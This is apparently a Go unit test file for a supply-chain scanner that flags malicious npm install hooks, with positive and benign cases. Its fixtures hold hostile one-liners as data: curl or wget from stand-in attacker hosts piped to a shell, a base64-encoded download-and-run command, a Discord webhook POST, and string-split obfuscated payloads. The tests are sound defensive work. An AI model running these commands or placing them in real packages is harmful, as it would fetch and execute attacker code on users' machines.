package heuristics

import (
	"slices"
	"testing"

	"github.com/qwexvf/aegis-cli/internal/domain"
	"github.com/qwexvf/aegis-cli/internal/usecase"
)

// TestDetectSuspiciousInstallHook hits the canonical malware patterns
// observed in real npm incidents.
func TestDetectSuspiciousInstallHook(t *testing.T) {
	tests := []struct {
		name     string
		manifest string
		want     domain.Capability
	}{
		// --- positive cases (real-world malware shapes) ---
		{
			name: "curl pipe sh — event-stream / ua-parser-js style",
			manifest: `{
				"name": "totally-legit",
				"scripts": {
					"postinstall": "curl -sSL http://attacker.example/payload | sh"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "wget pipe bash",
			manifest: `{
				"scripts": {
					"preinstall": "wget -O- https://example.com/x | bash"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "node -e inline eval",
			manifest: `{
				"scripts": {
					"install": "node -e \"require('child_process').exec('curl ...')\""
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "python -c",
			manifest: `{
				"scripts": {
					"postinstall": "python3 -c 'import urllib.request; urllib.request.urlretrieve(\"...\")'"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "base64 piped to shell",
			manifest: `{
				"scripts": {
					"postinstall": "echo Y3VybCBodHRwczovL2F0dGFja2VyLmNvbXxiYXNo | base64 -d | sh"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "Discord webhook in install hook",
			manifest: `{
				"scripts": {
					"postinstall": "curl -X POST https://discord.com/api/webhooks/111/aaa -d ..."
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "Pastebin fetch",
			manifest: `{
				"scripts": {
					"postinstall": "wget https://pastebin.com/raw/abc123 -O /tmp/p"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "ngrok tunnel",
			manifest: `{
				"scripts": {
					"install": "curl http://abc.ngrok.io/payload | sh"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},

		// --- negative cases (legitimate hooks) ---
		{
			name: "no scripts at all",
			manifest: `{
				"name": "x",
				"version": "1.0.0"
			}`,
			want: 0,
		},
		{
			name: "node-gyp rebuild (the most common legit postinstall)",
			manifest: `{
				"scripts": {
					"postinstall": "node-gyp rebuild"
				}
			}`,
			want: 0,
		},
		{
			name: "patch-package",
			manifest: `{
				"scripts": {
					"postinstall": "patch-package"
				}
			}`,
			want: 0,
		},
		{
			name: "husky install",
			manifest: `{
				"scripts": {
					"prepare": "husky install"
				}
			}`,
			want: 0,
		},
		{
			name: "node --eval CI-skip guard then husky (real-world: @colordx/core)",
			manifest: `{
				"scripts": {
					"prepare": "node --eval \"if (process.env.CI) process.exit(0)\" && husky || true"
				}
			}`,
			want: 0,
		},
		{
			name: "node -e short benign one-liner",
			manifest: `{
				"scripts": {
					"prepare": "node -e \"process.exit(0)\""
				}
			}`,
			want: 0,
		},
		{
			name: "node -e with require still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "node -e \"require('https').get('https://x.com/p')\""
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "node -e with very long opaque body still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "node -e \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOP\""
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "mention of curl in test script doesn't count (test isn't install-time)",
			manifest: `{
				"scripts": {
					"test": "curl localhost | jest"
				}
			}`,
			want: 0,
		},
		{
			name:     "broken JSON returns 0 silently",
			manifest: `{`,
			want:     0,
		},

		// Mini Shai-Hulud / TanStack 2026 patterns
		{
			name: "tanstack-2026 — bun run localfile && exit 1 in prepare",
			manifest: `{
				"scripts": {
					"prepare": "bun run tanstack_runner.js && exit 1"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "bun run localfile && exit 0 in postinstall",
			manifest: `{
				"scripts": {
					"postinstall": "bun run setup.js && exit 0"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "npx run localfile && exit 1 in postinstall",
			manifest: `{
				"scripts": {
					"postinstall": "npx run payload.mjs && exit 1"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "deno run localfile && exit 1 in postinstall",
			manifest: `{
				"scripts": {
					"postinstall": "deno run payload.ts && exit 1"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "bun run localfile without && exit still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "bun run install_hook.js"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "deno run localfile without && exit still flagged",
			manifest: `{
				"scripts": {
					"postinstall": "deno run payload.ts"
				}
			}`,
			want: domain.CapInstallHookSuspicious,
		},
		{
			name: "bun install in prepare — legitimate dependency install",
			manifest: `{
				"scripts": {
					"prepare": "bun install"
				}
			}`,
			want: 0,
		},
		{
			name: "deno install in prepare — legitimate dependency install",
			manifest: `{
				"scripts": {
					"prepare": "deno install"
				}
			}`,
			want: 0,
		},
	}

	p := &npmParser{}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			manifestRaw := []byte(tc.manifest)
			pkg := p.Parse("", manifestRaw, usecase.PackageSource{Manifest: manifestRaw})
			got := checkInstallHooks(pkg)
			if tc.want == 0 {
				if len(got) != 0 {
					t.Errorf("checkInstallHooks = %v, want []", got)
				}
			} else {
				if !slices.Contains(got, tc.want) {
					t.Errorf("checkInstallHooks = %v, want %v", got, tc.want)
				}
			}
		})
	}
}

// Split-string obfuscation must not hide a curl|sh / eval payload: the
// matcher collapses adjacent string-literal concatenations before scanning.
func TestScriptMatchesMalwarePattern_DefeatsConcatObfuscation(t *testing.T) {
	bad := []string{
		`"cur" + "l -fsSL http://evil.example/x.sh | sh"`,
		`"cu"+"rl htt"+"p://evil.example | ba"+"sh"`,
		`'curl http://evil.example | ' + 'sh'`,
	}
	for _, s := range bad {
		if !scriptMatchesMalwarePattern(s) {
			t.Errorf("expected malware match for split-string payload: %s", s)
		}
	}
	good := []string{
		`console.log("hello " + "world")`,
		`"build" + "/output"`,
	}
	for _, s := range good {
		if scriptMatchesMalwarePattern(s) {
			t.Errorf("false positive on benign concat: %s", s)
		}
	}
}
